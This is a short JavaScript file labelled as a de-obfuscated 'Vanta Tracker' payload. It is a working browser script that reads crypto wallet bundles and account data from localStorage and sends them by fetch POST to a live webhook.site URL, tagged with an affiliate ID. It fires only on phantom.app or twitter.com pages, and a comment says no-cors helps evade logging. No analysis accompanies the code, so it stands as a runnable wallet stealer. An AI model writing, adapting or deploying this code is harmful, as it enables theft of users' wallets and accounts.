/**
 * VANTA TRACKER - DE-OBFUSCATED PAYLOAD
 * Purpose: Demonstration of LocalStorage Exfiltration
 */
(function() {
    const DESTINATION = 'https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515';
    const AFFILIATE = 'TK0XQV';

    console.log("Vanta Payload Loaded...");

    // 1. The Scraper: Targets specific sensitive keys
    const harvestData = () => {
        return {
            wallet_bundle: localStorage.getItem('padre-v2-bundles-store-v2'),
            accounts: localStorage.getItem('vanta_accounts'),
            origin: window.location.hostname,
            timestamp: new Date().getTime()
        };
    };

    // 2. The Exfiltration: Sends data to your webhook
    const transmit = (data) => {
        fetch(DESTINATION, {
            method: 'POST',
            mode: 'no-cors', // Bypasses some basic security logging
            body: JSON.stringify({
                affiliate: AFFILIATE,
                payload: data
            })
        }).then(() => {
            alert("Analysis Complete. Check your dashboard.");
        });
    };

    // 3. Execution Flow
    // In the real world, this would wait for the user to be on the correct site
    if (window.location.hostname.includes('phantom.app') || window.location.hostname.includes('twitter.com')) {
        const stolenData = harvestData();
        transmit(stolenData);
    } else {
        alert("Please run this tool on the target application page.");
    }
})();
